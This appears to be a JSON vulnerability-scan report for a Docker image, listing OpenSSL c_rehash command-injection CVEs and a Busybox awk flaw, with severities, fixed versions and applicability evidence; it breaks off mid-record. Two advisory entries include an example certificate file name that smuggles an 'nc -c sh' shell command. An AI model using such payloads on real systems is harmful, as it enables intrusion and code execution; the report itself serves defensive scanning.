{
   "total_count": 93,
   "data": [
      {
         "id": "XRAY-229353",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "1.0.2-r0 ≤ Version ≤ 1.0.2o-r1",
               "1.1.1-r0 ≤ Version < 1.1.1p-r0"
            ],
            "fixed_versions": [
               "1.1.1p-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2068",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-229353",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper input validation in OpenSSL's c_rehash script leads to command injection.",
            "FullDescription": "OpenSSL's `c_rehash` script is used to create symbolic links to `.pem`, `.crt`, `.cer` and `.crl ` certificate files, using the certificate's hash value as the symbolic link's name. This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\n\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\n\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nThe [`openssl rehash`](https://www.openssl.org/docs/manmaster/man1/c_rehash.html) tool should be used instead of the `c_rehash` script",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The `c_rehash` script is deprecated and is only used automatically in some operating systems, it is unlikely that a remote attacker will be able to create a crafted directory for `c_rehash` to process",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to arbitrary command execution with `c_rehash`'s privileges",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only exploitable if the `c_rehash` script is used on an attacker-controlled directory",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220621.txt",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-2068",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/etc/ca-certificates/update.d/certhash",
                        "0x00000018",
                        "The vulnerable string 'c_rehash' was found in the image"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable string 'c_rehash' was found in the image",
            "details": [
               {
                  "file_path": "/etc/ca-certificates/update.d/certhash",
                  "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-2068",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-229353",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "1.0.2-r0 ≤ Version ≤ 1.0.2o-r1",
               "1.1.1-r0 ≤ Version < 1.1.1p-r0"
            ],
            "fixed_versions": [
               "1.1.1p-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2068",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-229353",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper input validation in OpenSSL's c_rehash script leads to command injection.",
            "FullDescription": "OpenSSL's `c_rehash` script is used to create symbolic links to `.pem`, `.crt`, `.cer` and `.crl ` certificate files, using the certificate's hash value as the symbolic link's name. This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\n\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\n\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nThe [`openssl rehash`](https://www.openssl.org/docs/manmaster/man1/c_rehash.html) tool should be used instead of the `c_rehash` script",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The `c_rehash` script is deprecated and is only used automatically in some operating systems, it is unlikely that a remote attacker will be able to create a crafted directory for `c_rehash` to process",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to arbitrary command execution with `c_rehash`'s privileges",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only exploitable if the `c_rehash` script is used on an attacker-controlled directory",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220621.txt",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-2068",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/etc/ca-certificates/update.d/certhash",
                        "0x00000018",
                        "The vulnerable string 'c_rehash' was found in the image"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable string 'c_rehash' was found in the image",
            "details": [
               {
                  "file_path": "/etc/ca-certificates/update.d/certhash",
                  "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-2068",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-209584",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "1.0.2-r0 ≤ Version ≤ 1.0.2o-r1",
               "1.1.1-r0 ≤ Version < 1.1.1o-r0"
            ],
            "fixed_versions": [
               "1.1.1o-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1292",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
               "provider": "JFrog"
            }
         },
         "edited": "2022-12-22T09:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-209584",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper filename validation in `c_rehash` can lead to arbitrary code execution.",
            "FullDescription": "[c_rehash](https://www.openssl.org/docs/man3.0/man1/c_rehash.html) is a script, part of the OpenSSL package, which is used to create symbolic links to certificate files. The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\n\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\n\nExample: \n\n1. Create the certificate file with a name containing the payload:\n\n```\necho \"-----BEGIN CERTIFICATE-----\" > \"hey.crt\\`nc -c sh 127.0.0.1 12345\\`\"\n```\n\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\n\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\n\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "If the applicability conditions exist, it is trivial to craft a payload in a command line injected in a certificate filename.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The likelihood of an attacker being able to write certificates in one of the paths that are monitored by `c_rehash` or `update-ca-certificates` is very low. For a system to be vulnerable to this CVE, there must be an applicative way to upload or rename certificate files to the system or a filesystem permissions misconfiguration that allows a non-root user on the machine to write to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "For exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=blobdiff;f=tools/c_rehash.in;h=a630773a0240834476e74a7eb049a0d22729c383;hp=d51d8856d709cda39f939c1e04faeb0a31d599e6;hb=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2;hpb=7d56a74a96828985db7354a55227a511615f732b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup with PoC",
                  "Url": "https://github.com/alcaparra/CVE-2022-1292",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-1292",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/etc/ca-certificates/update.d/certhash",
                        "0x00000018",
                        "The vulnerable string 'c_rehash' was found in the image"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable string 'c_rehash' was found in the image",
            "details": [
               {
                  "file_path": "/etc/ca-certificates/update.d/certhash",
                  "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-1292",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-209584",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "1.0.2-r0 ≤ Version ≤ 1.0.2o-r1",
               "1.1.1-r0 ≤ Version < 1.1.1o-r0"
            ],
            "fixed_versions": [
               "1.1.1o-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1292",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
               "provider": "JFrog"
            }
         },
         "edited": "2022-12-22T09:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-209584",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper filename validation in `c_rehash` can lead to arbitrary code execution.",
            "FullDescription": "[c_rehash](https://www.openssl.org/docs/man3.0/man1/c_rehash.html) is a script, part of the OpenSSL package, which is used to create symbolic links to certificate files. The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\n\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\n\nExample: \n\n1. Create the certificate file with a name containing the payload:\n\n```\necho \"-----BEGIN CERTIFICATE-----\" > \"hey.crt\\`nc -c sh 127.0.0.1 12345\\`\"\n```\n\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\n\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\n\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "If the applicability conditions exist, it is trivial to craft a payload in a command line injected in a certificate filename.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The likelihood of an attacker being able to write certificates in one of the paths that are monitored by `c_rehash` or `update-ca-certificates` is very low. For a system to be vulnerable to this CVE, there must be an applicative way to upload or rename certificate files to the system or a filesystem permissions misconfiguration that allows a non-root user on the machine to write to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "For exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=blobdiff;f=tools/c_rehash.in;h=a630773a0240834476e74a7eb049a0d22729c383;hp=d51d8856d709cda39f939c1e04faeb0a31d599e6;hb=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2;hpb=7d56a74a96828985db7354a55227a511615f732b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup with PoC",
                  "Url": "https://github.com/alcaparra/CVE-2022-1292",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-1292",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/etc/ca-certificates/update.d/certhash",
                        "0x00000018",
                        "The vulnerable string 'c_rehash' was found in the image"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable string 'c_rehash' was found in the image",
            "details": [
               {
                  "file_path": "/etc/ca-certificates/update.d/certhash",
                  "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-1292",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190232",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42378",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
